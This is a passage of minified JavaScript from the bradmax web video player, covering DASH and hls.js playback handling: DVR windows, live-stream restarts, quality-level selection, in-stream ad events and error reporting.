b=this.player.getDashMetrics().getCurrentDVRInfo();if(null!=b&&null!=b.range){var c={start:b.range.start,end:b.range.end};if(this.media instanceof xa){var d=this.player.getDVRSeekOffset(864e5);0<d&&d>b.range.start&&(c.end=d),1<this.getDashStreamPeriodsNum()&&0<this.liveStreamNowOffset&&(c.end=this.getNowTs()-this.liveStreamNowOffset),c.end<this.media.mediaPlaybackInfo.currentTime&&(c.end=this.media.mediaPlaybackInfo.currentTime)}return this.lastDvrWindowStart=c.start,this.lastDvrWindowEnd=c.end,c}if(null!=this.lastDvrWindowEnd&&null!=this.lastDvrWindowStart)return{start:this.lastDvrWindowStart,end:this.lastDvrWindowEnd}}return null!=this.video&&null==this.video.seekable&&0==this.video.seekable.length?{start:this.video.seekable.start(0),end:this.video.seekable.end(0)}:{start:0,end:0}},getDVRWindowSize:function(){var b=this.getDVRWindowRange();return b.end-b.start},getNowTs:function(){return(new Date).getTime()/1e3},selectAudio:function(b){},selectSubtitles:function(b){},volume:function(b){this.initialVideoIsMuted=0>=b,null!=this.player&&this.hasDashJsInitializedSource?this.player.setVolume(b):this.video.volume=b},setData:function(b){this.media=b,this.startTimeStatus=0,this.initialVideoIsMuted=this.isPlaybackNotAllowed=this.shouldBePlaying=this.isBuffering=this.hasProtectionData=this.hasSeekingStartTriggeded=this.hasQualityInfoInitialized=this.hasCodecInfoInitialized=this.hasSubtitlesInitialized=this.hasAudioInitialized=this.hasDashJsInitializedManifest=this.hasDashJsInitializedSource=!1,null!=this.video&&(this.initialVideoIsMuted=this.video.muted),this.hasPlaybackSuccStarted=!1,this.drmLicenseCheckStatus=0,this.liveStreamNowOffset=null,this.videoRestartsOnError=this.liveStreamNowOffsetLastUpdate=0,this.seekingTargetTs=this.seekingTargetPos=this.seekingStartDate=null,this.stopSeekDebouncerTimer(),this.currentTime=this.lastDvrWindowEnd=this.lastDvrWindowStart=null,this.playbackRateMetter.reset(),this.adBreaksInfo=null,Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowStartTime")?(this.dvrWindowStartTimeTs=m.field(this.variables,"dvrWindowStartTime"),this.getNowTs()<this.dvrWindowStartTimeTs&&(this.dvrWindowStartTimeTs=null),m.deleteField(this.variables,"dvrWindowStartTime")):this.dvrWindowStartTimeTs=null,Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowEndTime")?(this.dvrWindowEndTimeTs=m.field(this.variables,"dvrWindowEndTime"),m.deleteField(this.variables,"dvrWindowEndTime")):this.dvrWindowEndTimeTs=null,1==this.variables.autoplay&&this.play()},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},playerResize:function(b){},videoReady:function(){},onDurationChange:function(b){},saveBandwidthModeVisibilityChange:function(b){null!=this.player&&(b?(b=this.player.getSettings(),this.saveBandwidthModeStore={level:this.player.getQualityFor("video"),trackSwitchMode:b.streaming.abr.trackSwitchMode,maxRepresentationRatio:b.streaming.abr.maxRepresentationRatio,autoSwitchBitrate:b.streaming.abr.autoSwitchBitrate},b.streaming.abr.trackSwitchMode={video:"alwaysReplace"},b.streaming.abr.maxRepresentationRatio={video:0},b.streaming.abr.autoSwitchBitrate={video:!1},this.player.updateSettings(b),this.player.setQualityFor("video",0)):null!=this.saveBandwidthModeStore&&((b=this.player.getSettings()).streaming.abr.trackSwitchMode=this.saveBandwidthModeStore.trackSwitchMode,b.streaming.abr.maxRepresentationRatio=this.saveBandwidthModeStore.maxRepresentationRatio,b.streaming.abr.autoSwitchBitrate=this.saveBandwidthModeStore.autoSwitchBitrate,this.player.updateSettings(b),this.player.setQualityFor("video",this.saveBandwidthModeStore.level),this.saveBandwidthModeStore=null))},getThroughput:function(){return null!=this.player?1e3*(this.player.getAverageThroughput("video")+this.player.getAverageThroughput("audio")):null},__class__:gc};var tc=function(b){this.saveBandwidthModeStore=null,this.playbackRate=1,this.isAdvertisement=this.isInStreamAdvertisement=this.initialAsAdvertisement=!1,this.minAudioTracksForInfo=2,null==tc.instances.h[(b?"ad_":"")+this.context]&&(this.pluginConfig=Kb.readPluginConfig(this),this.initialAsAdvertisement=this.isAdvertisement=b,this.isInStreamAdvertisement=!1,this.isQualitySelectionEnabled=!0,this.hasSubtitlesAndAudioInitialized=!1,this.liveStreamRestartsOnError=0,this.prePlaybackSeekRelativePosition=null,this.prePlaybackHandlingSeeking=!1,this.dvrWindowLength=this.dvrRequestedInitialTimeTs=this.dvrPlaybackStartTs=null,this.isPlaybackNotAllowed=this.isHlsLiveStream=this.dvrIsSupported=!1,this.unfreezeEdgeBrowserTimer=this.lastTimeUpdatePostionForEdgeBrowser=null,this.hlsQualityLevel=p.parseInt("-1"),this.playbackState=0,this.saveBandwidthModeStore=null)};wa["bs.player.plugin.video.videoPlayer.VideoHlsJs"]=tc,tc.__name__="bs.player.plugin.video.videoPlayer.VideoHlsJs",tc.__interfaces__=[pa,S],tc.canPlay=function(b){return!(!h.isSamsungSmartTVTizen&&"Safari"==h.browserName||"Microsoft Internet Explorer"==h.browserName&&11>h.majorVersion||null!=b.drm)&&1<b.url.toLowerCase().indexOf(".m3u8")},tc.getInstance=function(b,c){var d=c?"ad_":"";return Object.prototype.hasOwnProperty.call(tc.instances.h,d+b)?tc.instances.h[d+b]:(c=new tc(c),tc.instances.h[d+b]=c,c.context=b,c.create(),c)},tc.prototype={minAudioTracksForInfo:null,context:null,variables:null,isAdvertisement:null,isInStreamAdvertisement:null,initialAsAdvertisement:null,inStreamAdvertStartPos:null,inStreamAdvertMedia:null,video:null,pluginConfig:null,hasSubtitlesAndAudioInitialized:null,player:null,s73Wrapper:null,media:null,source:null,subtitlesRenderer:null,isQualitySelectionEnabled:null,liveStreamRestartsOnError:null,liveStreamRestartTimeoutTimer:null,liveStreamEndingTimeout:null,liveStreamRestartDelayTimer:null,prePlaybackSeekRelativePosition:null,prePlaybackHandlingSeeking:null,dvrPlaybackStartTs:null,dvrRequestedInitialTimeTs:null,dvrWindowLength:null,dvrIsSupported:null,isHlsLiveStream:null,hlsQualityLevel:null,isPlaybackNotAllowed:null,isBuffering:null,lastTimeUpdatePostionForEdgeBrowser:null,unfreezeEdgeBrowserTimer:null,playbackState:null,liveEdgeUpdateTimer:null,dvrWindowStartTimeTs:null,dvrWindowEndTimeTs:null,playbackRate:null,saveBandwidthModeStore:null,create:function(){W.add(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.add(this.context,"selectAudio",U(this,this.onSelectAudio)),W.add(this.context,"requestVideoQualityChange",U(this,this.onVideoQualityChange)),Q.add(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.add(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd))},destroy:function(){W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.remove(this.context,"selectAudio",U(this,this.onSelectAudio)),W.remove(this.context,"requestVideoQualityChange",U(this,this.onVideoQualityChange)),Q.remove(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.remove(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd)),this.stopLiveEdgeUpdateTimer(),this.cleanVideoAndPlayer(),this.media=null,this.liveStreamRestartsOnError=0},cleanVideoAndPlayer:function(){this.cleanPlayer(),null!=this.video&&(this.video.removeEventListener("pause",U(this,this.onHlsjsPause)),this.video.removeEventListener("play",U(this,this.onHlsjsPlay)),this.video.removeEventListener("playing",U(this,this.onHlsjsPlaying)),this.video.removeEventListener("timeupdate",U(this,this.onHlsjsTimeupdate)),this.video.removeEventListener("durationchange",U(this,this.onHlsjsDurationchange)),this.video.removeEventListener("waiting",U(this,this.onHlsjsWaiting)),this.video.removeEventListener("ended",U(this,this.onHlsjsEnded)),this.video.removeEventListener("seeked",U(this,this.onHlsjsSeeked)),this.video.removeEventListener("canplaythrough",U(this,this.onVideoCanplaythrough)),null!=this.video.textTracks&&this.video.textTracks.removeEventListener("addtrack",U(this,this.onAddTrack)),this.video.removeEventListener("ratechange",U(this,this.onVideoRateChange)),this.video.pause(),this.video=null),this.saveBandwidthModeStore=this.source=null},onAdInStreamPlaying:function(b){this.isInStreamAdvertisement=this.isAdvertisement=!0},onAdClipInStreamPlaying:function(b){null!=this.video&&null!=this.media&&(this.inStreamAdvertStartPos=null,0<=this.video.currentTime&&(this.inStreamAdvertStartPos=this.video.currentTime),this.inStreamAdvertMedia=null,null!=b&&null!=b.data&&(this.inStreamAdvertMedia=b.data.media))},onAdClipInStreamEnd:function(b){this.inStreamAdvertMedia=this.inStreamAdvertStartPos=null},onAdInStreamEnd:function(b){this.isAdvertisement=this.initialAsAdvertisement,this.isInStreamAdvertisement=!1},onLiveEdgeUpdate:function(){null!=this.player&&this.hasSubtitlesAndAudioInitialized&&this.isPaused()&&this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange"))},dispatchEvent:function(b,c){if(null!=this.video){var d=this.video.duration,q=this.video.currentTime;if(null!=this.media&&this.hasSubtitlesAndAudioInitialized&&(this.media.mediaPlaybackInfo.currentTime=q,this.media.mediaPlaybackInfo.isPlaying=!this.video.paused,null!=this.player&&null!=this.player.levels&&null!=this.player.currentLevel&&this.player.currentLevel<this.player.levels.length&&null!=this.player.levels[this.player.currentLevel]&&0<this.player.levels[this.player.currentLevel].bitrate&&(this.media.mediaPlaybackInfo.currentTotalBitrateKpbs=Math.round(this.player.levels[this.player.currentLevel].bitrate/1e3)),this.media.mediaPlaybackInfo.playbackRate=this.getPlaybackRate(),this.isDvr()&&(q=this.dvrRelativePlaybackTimeToDvrWindowTime(this.video.currentTime),this.media.mediaPlaybackInfo.currentTime=this.dvrRelatibePlaybackTimeToTs(this.video.currentTime))),this.isDvr()){d=this.dvrIsSupported?this.dvrWindowLength:1;var X=this.media,ra=this.getDVRWindowRange();null!=ra&&null!=this.dvrPlaybackStartTs?(X.dvrWindowLength=ra.end-ra.start,X.dvrWindowLiveEdge=this.dvrRelatibePlaybackTimeToTs(ra.end)):(X.dvrWindowLength=this.dvrWindowLength,X.dvrWindowLiveEdge=(new Date).getTime()/1e3),null!=X.dvrWindowLength&&(d=X.dvrWindowLength),null==this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer=new Rb(1e3),this.liveEdgeUpdateTimer.run=U(this,this.onLiveEdgeUpdate))}null==b.data&&(b.data={}),0==q&&null!=this.media&&null!=this.media.mediaUserSettings&&0<this.media.mediaUserSettings.resumePostion&&(q=this.media.mediaUserSettings.resumePostion),this.isInStreamAdvertisement&&0<=this.inStreamAdvertStartPos&&(q=this.video.currentTime-this.inStreamAdvertStartPos,null!=this.inStreamAdvertMedia&&(d=this.inStreamAdvertMedia.duration),q>d&&(q=d)),b.data.duration=d,b.data.currentTime=q,b.data.videoTagCurrentTime=this.video.currentTime,b.data.source=this.video.currentSrc,b.data.media=this.media,b.data.additionalData=c,this.isPlaybackNotAllowed&&(null==b.data.additionalData&&(b.data.additionalData={}),b.data.additionalData.isPlaybackNotAllowed=!0),b.dispatch(this.context)}},onHlsjsLevelLoaded:function(b,c){null!=c&&null!=c.details&&(this.isHlsLiveStream=c.details.live,this.checkMediaType(),null==this.dvrWindowLength&&(this.dvrWindowLength=c.details.totalduration,this.dvrIsSupported=this.dvrWindowLength>this.getLiveStreamDvrMinLen()),null!=c.level&&this.updateVideoQualityPlaybackLevel(c.level)),this.triggerCodecsEvent()},getLiveStreamDvrMinLen:function(){var b=600;return Object.prototype.hasOwnProperty.call(this.variables,"dvrMinLenForSeekbar")&&0<=this.variables.dvrMinLenForSeekbar&&(b=this.variables.dvrMinLenForSeekbar),Object.prototype.hasOwnProperty.call(this.pluginConfig,"liveStreamDvrMinLen")&&null!=m.field(this.pluginConfig,"liveStreamDvrMinLen")&&(b=this.pluginConfig.liveStreamDvrMinLen),b},onHlsjsManifestLoaded:function(b,c){this.isDvr()&&(this.dvrPlaybackStartTs=null),this.triggerCodecsEvent(),this.updateVideoQualityList()},checkMediaType:function(){if(this.media instanceof va&&this.isHlsLiveStream&&!(this.media instanceof xa)){for(var b=new xa,c=g.getInstanceFields(va),d=0;d<c.length;){var q=c[d];++d,b[q]=m.field(this.media,q)}this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=b,c.dispatch(this.context)}if(this.media instanceof xa&&!this.isHlsLiveStream&&0<this.video.duration){for(b=new va,c=g.getInstanceFields(va),d=0;d<c.length;)q=c[d],++d,b[q]=m.field(this.media,q);this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=this.media,c.dispatch(this.context)}},xhrSetupForToHttpsRedirect:function(b,c){"http://"==da.substr(c,0,7)&&(c="https://"+da.substr(c,7,null)),b.open("GET",c,!0)},initPlayer:function(){var b={maxMaxBufferLength:120,maxBufferLength:30,autoStartLoad:!0,lowLatencyMode:!1,capLevelOnFPSDrop:!0,fpsDroppedMonitoringPeriod:1e4,fpsDroppedMonitoringThreshold:.05};if(h.isSamsungSmartTVTizen&&(b.liveSyncDuration=20),Object.prototype.hasOwnProperty.call(this.pluginConfig,"hlsSettings")&&null!=this.pluginConfig.hlsSettings)for(var c=0,d=m.fields(this.pluginConfig.hlsSettings);c<d.length;){var q=d[c];++c;var X=m.field(this.pluginConfig.hlsSettings,q);b[q]=X}if(Object.prototype.hasOwnProperty.call(this.variables,"hlsSettings")&&null!=this.variables.hlsSettings)for(c=0,d=m.fields(this.variables.hlsSettings);c<d.length;)q=d[c],++c,X=m.field(this.variables.hlsSettings,q),b[q]=X;Object.prototype.hasOwnProperty.call(this.variables,"saveBandwidthMode")&&fb.__cast(this.variables.saveBandwidthMode,be)&&(b.capLevelToPlayerSize=!0),null!=this.media&&(null!=(c=this.getPlaybackStartTime(this.media))&&(b.startPosition=c),null!=this.media.source&&0<this.media.source.length&&null!=this.media.source[0]&&1==this.media.source[0].customParams.h.hlsjsForceHttpsUse&&(b.xhrSetup=U(this,this.xhrSetupForToHttpsRedirect)),this.media instanceof xa&&1==this.media.lowLatencyMode&&(b.lowLatencyMode=!0)),null!=this.player&&this.player.destroy(),(c=Object.prototype.hasOwnProperty.call(this.variables,"system73")&&0==this.liveStreamRestartsOnError&&window.BigInt&&window.S73HlsjsWrapper&&!this.isAdvertisement)&&(this.s73Wrapper=S73HlsjsWrapper(m.field(this.variables,"system73"),{Hls:pb.hls}),this.s73Wrapper.wrapPlayerConfig(b)),this.player=uf.create(b),c&&this.s73Wrapper.wrapPlayer(this.player),this.player.attachMedia(this.video),this.player.on(pb.hls.Events.LEVEL_LOADED,U(this,this.onHlsjsLevelLoaded)),this.player.on(pb.hls.Events.LEVEL_SWITCHED,U(this,this.onHlsjsPlaybackBitrateChange)),this.player.on(pb.hls.Events.MANIFEST_LOADED,U(this,this.onHlsjsManifestLoaded)),this.player.on(pb.hls.Events.ERROR,U(this,this.onHlsjsError))},onPlayerResetWithMseExtension:function(){if(null!=this.video){this.video.removeEventListener("player_reset",U(this,this.onPlayerResetWithMseExtension));var b=this.video;this.video=null,this.attachVideo(b),null!=this.media&&this.play()}},attachSubtitlesRenderer:function(b){this.subtitlesRenderer=b},attachVideo:function(b){this.video!=b&&(this.cleanPlayer(),Object.prototype.hasOwnProperty.call(this.variables,"qualitySelectionEnabled")&&(this.isQualitySelectionEnabled=m.field(this.variables,"qualitySelectionEnabled")),this.video=b,this.initPlayer(),this.video.addEventListener("pause",U(this,this.onHlsjsPause)),this.video.addEventListener("play",U(this,this.onHlsjsPlay)),this.video.addEventListener("playing",U(this,this.onHlsjsPlaying)),this.video.addEventListener("timeupdate",U(this,this.onHlsjsTimeupdate)),this.video.addEventListener("durationchange",U(this,this.onHlsjsDurationchange)),this.video.addEventListener("waiting",U(this,this.onHlsjsWaiting)),this.video.addEventListener("ended",U(this,this.onHlsjsEnded)),this.video.addEventListener("seeked",U(this,this.onHlsjsSeeked)),this.video.addEventListener("canplaythrough",U(this,this.onVideoCanplaythrough)),null!=this.video.textTracks&&this.video.textTracks.addEventListener("addtrack",U(this,this.onAddTrack)),this.video.addEventListener("ratechange",U(this,this.onVideoRateChange)),this.checkPlaybackRate(),this.triggerVideoPlaybackRateEvent())},setPlaybackRate:function(b){this.isAdvertisement||(this.playbackRate=b,this.checkPlaybackRate())},getPlaybackRate:function(){return this.video.playbackRate},onVideoRateChange:function(b){this.triggerVideoPlaybackRateEvent()},triggerVideoPlaybackRateEvent:function(){if(!this.isAdvertisement){var b=new T("playbackRate");b.data=this.getPlaybackRate(),b.dispatch(this.context)}},checkPlaybackRate:function(){this.isAdvertisement||isNaN(this.playbackRate)||this.getPlaybackRate()==this.playbackRate||(this.video.playbackRate=this.playbackRate)},cleanPlayer:function(){if(null!=this.s73Wrapper){try{this.s73Wrapper.destroy()}catch(b){}this.s73Wrapper=null}null!=this.player&&(this.player.detachMedia(),this.player.destroy(),this.player=null)},reset:function(){},isPaused:function(){return null==this.video||this.video.paused},onAddTrack:function(b){var c=this.isAdvertisement?new Q("addTrack"):new T(T.ADD_TRACK);c.data={track:b},this.dispatchEvent(c)},onHlsjsPause:function(b){return this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")),this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1,20==this.playbackState&&this.onHlsjsEnded(),null},onHlsjsPlay:function(b){return this.checkPlaybackRate(),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")),null},stopLiveStreamRestartTimeoutTimer:function(){null!=this.liveStreamRestartTimeoutTimer&&(this.liveStreamRestartTimeoutTimer.stop(),this.liveStreamRestartTimeoutTimer=null)},stopLiveStreamRestartDelayTimer:function(){null!=this.liveStreamRestartDelayTimer&&(this.liveStreamRestartDelayTimer.stop(),this.liveStreamRestartDelayTimer=null)},stopLiveStreamEndingTimeout:function(){null!=this.liveStreamEndingTimeout&&(this.liveStreamEndingTimeout.stop(),this.liveStreamEndingTimeout=null)},stopLiveEdgeUpdateTimer:function(){null!=this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer.stop(),this.liveEdgeUpdateTimer=null)},onHlsjsPlaying:function(b){return this.stopLiveStreamRestartTimeoutTimer(),this.liveStreamRestartsOnError=0,this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1,this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")),null},unfreezeEdgeBrowser:function(){var b=this;this.stopUnfreezeEdgeBrowserTimer(),null!=this.video&&0<this.video.currentTime&&(this.video.currentTime+=.2,this.lastTimeUpdatePostionForEdgeBrowser=null,Rb.delay((function(){b.video.currentTime+=.2}),100))},stopUnfreezeEdgeBrowserTimer:function(){null!=this.unfreezeEdgeBrowserTimer&&(this.unfreezeEdgeBrowserTimer.stop(),this.unfreezeEdgeBrowserTimer=null)},isVideoStalledAtEnd:function(){return null!=this.video&&!this.isDvr()&&.15>Math.abs(this.video.duration-this.video.currentTime)},triggerVideoCompleteOnVideoStalledAtEnd:function(){this.video.pause(),this.playbackState=25,this.video.currentTime=0},triggerVideoCompleteOnVideoStalledAtEndComplete:function(){this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1,this.onHlsjsEnded(),this.playbackState=0},onHlsjsTimeupdate:function(b){return 0==this.video.readyState||25==this.playbackState||(this.playbackState=0,b=this.isDvr(),this.getNowTs(),this.stopUnfreezeEdgeBrowserTimer(),h.isEdge&&null!=this.video&&!this.video.paused&&(this.lastTimeUpdatePostionForEdgeBrowser==this.video.currentTime&&0<this.lastTimeUpdatePostionForEdgeBrowser&&(this.unfreezeEdgeBrowserTimer=Rb.delay(U(this,this.unfreezeEdgeBrowser),2e3)),this.lastTimeUpdatePostionForEdgeBrowser=this.video.currentTime),!this.isPlaybackNotAllowed||null==this.video||this.video.paused||this.video.seeking||(this.isPlaybackNotAllowed=!1),this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),this.isBuffering&&null!=this.video&&!this.video.paused&&!this.video.seeking&&4<=this.video.readyState&&(0<this.video.playbackRate||null==this.video.playbackRate)&&(this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1),b&&null!=this.dvrWindowEndTimeTs&&this.media.mediaPlaybackInfo.currentTime>this.dvrWindowEndTimeTs&&(new W("skinPause").dispatch(this.context),this.onHlsjsEnded())),null},onHlsjsDurationchange:function(b){return this.isHlsLiveStream||null!=this.media.duration||(this.media.duration=this.video.duration),null!=this.prePlaybackSeekRelativePosition&&(b=this.prePlaybackSeekRelativePosition,this.prePlaybackSeekRelativePosition=null,0<this.video.duration&&2<Math.abs(this.video.duration-this.media.duration)&&(this.prePlaybackHandlingSeeking=!0,this.seek(b*this.video.duration),this.pause())),this.dispatchEvent(this.isAdvertisement?new Q("adDurationChange"):new T("durationChange")),null},onHlsjsWaiting:function(b){return this.isVideoStalledAtEnd()?(this.triggerVideoCompleteOnVideoStalledAtEnd(),null):(this.isBuffering=!0,this.dispatchEvent(new T("bufferingStart")),null)},onHlsjsPlaybackBitrateChange:function(b,c){return null!=c&&null!=c.level&&this.updateVideoQualityPlaybackLevel(c.level),null},updateVideoQualityPlaybackLevel:function(b){this.hlsQualityLevel=b;var c=new aa("videoQualityPlaybackLevelChange");c.data=b,c.dispatch(this.context)},triggerCodecsEvent:function(){if(null!=this.player.levels&&null!=this.player.currentLevel&&this.player.levels.length>=this.player.currentLevel&&null!=this.player.levels[this.player.currentLevel]){var b=this.player.levels[this.player.currentLevel];if(null!=b&&null!=b.audioCodec&&null!=b.videoCodec){var c=new aa("codecData");c.data={audioCodec:b.audioCodec,videoCodec:b.videoCodec},c.dispatch(this.context)}}},updateVideoQualityList:function(){if(!(!this.isQualitySelectionEnabled||null==this.player.levels||2>this.player.levels.length||this.isAdvertisement)){var b=new aa("videoQualityData");b.data=this.getQualityLevels(),b.dispatch(this.context),(b=new W("videoQualityHasChanged")).data="-1",b.dispatch(this.context),this.setInitialVideoQualityKbps()}},setInitialVideoQualityKbps:function(){if(Object.prototype.hasOwnProperty.call(this.variables,"qualityInitialBandwidthKbs")){var b=m.field(this.variables,"qualityInitialBandwidthKbs");if(null!=b&&(null!=(b=1e3*p.parseInt(b))&&!isNaN(b)&&isFinite(b))){var c=0;if(0<b){c=-1;for(var d=0,q=this.player.levels;d<q.length;){var X=q[d],ra=d++;Object.prototype.hasOwnProperty.call(X,"bitrate")&&(null!=(X=m.field(X,"bitrate"))&&(null!=(X=p.parseInt(X))&&!isNaN(X)&&isFinite(X)&&X<=b&&(c=ra)))}}-1==c||this.player.startLevel==c&&this.player.nextAutoLevel==c||(this.player.startLevel=this.player.nextAutoLevel=c)}}},getQualityLevels:function(){var b="resolution";if(Object.prototype.hasOwnProperty.call(this.variables,"qualityLabelType")&&(b=(b=m.field(this.variables,"qualityLabelType")).toLowerCase()),"resolution"==b)for(var c=0,d=this.player.levels;c<d.length;){var q=d[c];if(++c,!(0<q.width&&0<q.height)){b="bitrate";break}}for((q=[]).push(new Eb("Auto","-1")),c=0,d=this.player.levels.length;c<d;){var X=c++,ra="resolution"==b?p.string(this.player.levels[X].height)+"p":this.mapBitrateToLabel(this.player.levels[X].bitrate);(ra=new Eb(ra,null==X?"null":""+X)).height=this.player.levels[X].height,ra.width=this.player.levels[X].width,ra.bitrateKbps=0<this.player.levels[X].bitrate?this.player.levels[X].bitrate/1e3:null,q.push(ra)}return q.reverse(),q},mapBitrateToLabel:function(b){return Math.floor(b/1e3)+"k"},onVideoCanplaythrough:function(){if(this.hasSubtitlesAndAudioInitialized||(this.updateSubtitlesSets(),this.updateAudioSets(),this.triggerCodecsEvent(),this.updateVideoQualityList(),this.hasSubtitlesAndAudioInitialized=!0),null==this.dvrPlaybackStartTs&&this.isDvr()){var b=this.getDVRWindowRangeRaw();null!=b&&(this.dvrPlaybackStartTs=this.getNowTs()-b.end,null!=this.dvrRequestedInitialTimeTs&&this.seek(this.dvrRequestedInitialTimeTs-this.dvrPlaybackStartTs))}},getDVRWindowRangeRaw:function(){return null==this.video||null==this.video.duration||0>=this.video.duration||null==this.dvrWindowLength?null:{start:this.video.duration-this.dvrWindowLength,end:this.video.duration}},isDvr:function(){return null!=this.media&&this.media instanceof xa},onHlsjsEndingTimeout:function(){this.onHlsjsEnded()},onHlsjsEnded:function(b){return this.stopLiveStreamEndingTimeout(),this.media instanceof Ca&&(this.playbackState=21),this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete")),null},onHlsjsSeeked:function(b){return this.prePlaybackHandlingSeeking&&(this.prePlaybackHandlingSeeking=!1,this.play(),this.pause()),25==this.playbackState&&this.triggerVideoCompleteOnVideoStalledAtEndComplete(),this.dispatchEvent(this.isAdvertisement?new Q("seekingEnd"):new T("seekingEnd")),this.isPaused()&&(this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1),null},onHlsjsError:function(b,c){if(this.isAdvertisement&&!this.isInStreamAdvertisement)return this.dispatchEvent(new Q("adMediaError"),this.prepareErrorMessage(b)),null;if(10==this.playbackState||c&&c.type==pb.hls.ErrorTypes.OTHER_ERROR||c&&c.type==pb.hls.ErrorTypes.MEDIA_ERROR&&"bufferFullError"==c.details)return null;if(c&&c.type==pb.hls.ErrorTypes.MEDIA_ERROR&&("bufferNudgeOnStall"==c.details||"bufferStalledError"==c.details))return this.isDvr()?this.hasLiveStreamEnded()&&this.handleLiveStreamEnding():this.isVideoStalledAtEnd()&&this.triggerVideoCompleteOnVideoStalledAtEnd(),null;if(c&&c.type==pb.hls.ErrorTypes.NETWORK_ERROR&&!c.fatal||c&&c.type==pb.hls.ErrorTypes.MEDIA_ERROR&&!c.fatal)return null;this.stopLiveStreamRestartTimeoutTimer();var d=!0;if(this.media instanceof Ca){var q=this.hasLiveStreamEnded();!q&&5<=this.liveStreamRestartsOnError&&--this.liveStreamRestartsOnError,q&&(d=!1,this.handleLiveStreamEnding())}return null!=b&&null!=c&&(console.error("bradmax.player.error: "+b),console.error(c)),d&&this.isDvr()&&5>this.liveStreamRestartsOnError&&!this.media.hasFallbackSources()&&(d=!1,this.stopLiveStreamRestartDelayTimer(),this.liveStreamRestartDelayTimer=Rb.delay(U(this,this.handleLivestreamRestart),2e3*(this.liveStreamRestartsOnError+1)),this.playbackState=10,this.isBuffering=!0,new T("bufferingStart").dispatch(this.context),b={hasplayerError:c,currTry:this.liveStreamRestartsOnError},this.dispatchEvent(this.isAdvertisement?new Q("adMediaErrorFallbackTry"):new T("mediaErrorFallbackTry"),b)),d&&(this.isNetworkConnectionProblem(c)?(this.pause(),this.dispatchEvent(this.isAdvertisement?new Q("adConnectionError"):new T("connectionError"),this.prepareErrorMessage(c))):this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("mediaError"),this.prepareErrorMessage(c))),null},prepareErrorMessage:function(b){var c=this.isNetworkConnectionProblem(b)&&(this.media instanceof Ca||0<this.video.currentTime||null!=b&&null!=b.response&&500<=b.response.code||null!=this.media.mediaUserSettings&&0<this.media.mediaUserSettings.resumePostion),d="";return null!=b&&null!=b.details&&(d+=" type: "+p.string(b.details)),null!=b&&null!=b.context&&null!=b.context.url&&(d+="\nurl: "+p.string(b.context.url)),{errObj:b,isTemporaryNetworkIssue:c,message:d}},hasLiveStreamEnded:function(){if(!(this.media instanceof Ca))return!1;var b=this.media;return null==b.streamEnd||b.streamEnd.getTime()<(new Date).getTime()},handleLiveStreamEnding:function(){new W("skinPause").dispatch(this.context),this.playbackState=20,this.stopLiveStreamEndingTimeout(),this.liveStreamEndingTimeout=Rb.delay(U(this,this.onHlsjsEndingTimeout),500)},isNetworkConnectionProblem:function(b){return null!=b&&b.type==pb.hls.ErrorTypes.NETWORK_ERROR&&null!=this.video&&null!=this.media},handleLivestreamRestart:function(){this.liveStreamRestartsOnError++,this.playbackState=11,this.stopLiveStreamRestartDelayTimer(),this.stopLiveStreamRestartTimeoutTimer();var b=this.video;this.cleanVideoAndPlayer(),this.attachVideo(b),this.play(),this.liveStreamRestartTimeoutTimer=Rb.delay(U(this,this.onHlsjsLivestreamRestartTimeout),1e4)},onHlsjsLivestreamRestartTimeout:function(){5>this.liveStreamRestartsOnError?this.handleLivestreamRestart():(this.playbackState=30,this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("mediaError"),{message:"Livestream restart all tries failed."}))},onVideoQualityChange:function(b){if(!(null==b||null==b.data||"string"!=typeof b.data||null==this.player||null==this.player.levels||2>this.player.levels.length)){var 